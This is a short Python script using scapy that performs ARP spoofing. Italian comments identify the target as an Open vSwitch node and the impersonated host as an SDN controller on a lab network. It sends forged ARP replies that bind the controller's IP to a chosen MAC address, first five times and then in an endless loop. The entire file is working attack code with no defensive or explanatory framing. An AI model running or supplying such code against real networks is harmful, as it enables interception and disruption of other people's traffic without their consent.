from scapy.all import *
import time



def get_mac(IP):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = 'eth0', inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def trick(victimIP, victimMAC, sourceIP, sourceMAC):
    p=(ARP(op = 2, pdst = victimIP, psrc = sourceIP, hwdst=victimMAC, hwsrc=sourceMAC))
    #send(ARP(op = 2, pdst = victimIP, psrc = sourceIP, hwdst=victimMAC, hwsrc=sourceMAC))
    #send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
    send(p)
    #print(p.summary())

victimIP='192.168.0.100' #OVS a caso della rete
victimMAC='7e:c7:77:dd:23:71' #MAC dell'OVS
sourceIP='192.168.0.200' #IP del controller
sourceMAC='a2:01:c1:3b:4c:1b'
#print(sourceMAC)

for i in range(5):
   trick(victimIP,victimMAC,sourceIP,sourceMAC)
#   time.sleep(1.5)

sourceMAC='a2:01:c1:3b:4c:1a'
while 1:
    trick(victimIP,victimMAC,sourceIP,sourceMAC)
    time.sleep(1.5)
